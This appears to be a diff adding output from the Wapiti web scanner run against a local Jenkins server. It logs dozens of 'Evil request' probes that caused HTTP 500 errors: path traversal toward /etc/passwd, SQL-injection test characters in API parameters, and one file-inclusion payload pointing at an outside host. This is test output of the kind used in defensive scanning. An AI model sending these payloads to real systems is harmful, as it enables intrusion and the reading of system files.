+    GET /view/all/api/xml?depth=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/json
+Evil request:
+    GET /view/all/api/json?tree=jobs%5Bname%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
+    GET /view/all/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+
+[*] Launching module sql
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/json
+Evil request:
+    GET /api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/xml
+Evil request:
+    GET /asynchPeople/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/json
+Evil request:
+    GET /computer/(master)/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/api/xml
+Evil request:
+    GET /api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/asynchPeople/api/json
+Evil request:
+    GET /asynchPeople/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/api/xml
+Evil request:
+    GET /computer/(master)/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/json
+Evil request:
+    GET /computer/(master)/loadStatistics/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=min%C2%BF%27%22%28&width=500&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=sec10&width=500%C2%BF%27%22%28&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/api/xml
+Evil request:
+    GET /computer/(master)/loadStatistics/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/json
+Evil request:
+    GET /computer/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=hour&width=500%C2%BF%27%22%28&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/api/xml
+Evil request:
+    GET /computer/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/json
+Evil request:
+    GET /credentials/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/api/xml
+Evil request:
+    GET /credentials/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/json
+Evil request:
+    GET /credentials/store/system/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/api/xml
+Evil request:
+    GET /credentials/store/system/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/json
+Evil request:
+    GET /credentials/store/system/domain/_/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/credentials/store/system/domain/_/api/xml
+Evil request:
+    GET /credentials/store/system/domain/_/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?32x32=%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?24x24=%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/iconSize
+Evil request:
+    GET /iconSize?16x16=%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=32x32
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/json
+Evil request:
+    GET /overallLoad/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/json
+Evil request:
+    GET /queue/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssAll
+Evil request:
+    GET /rssAll?flavor=rss20%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/overallLoad/api/xml
+Evil request:
+    GET /overallLoad/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/queue/api/xml
+Evil request:
+    GET /queue/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/rssFailed
+Evil request:
+    GET /rssFailed?flavor=rss20%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/json
+Evil request:
+    GET /view/all/api/json?tree=jobs%5Bname%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
+    GET /view/all/api/xml?tree=jobs%5Bname%5D%2Cviews%5Bname%2Cjobs%5Bname%5D%5D%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/view/all/api/xml
+Evil request:
+    GET /view/all/api/xml?depth=1%C2%BF%27%22%28 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
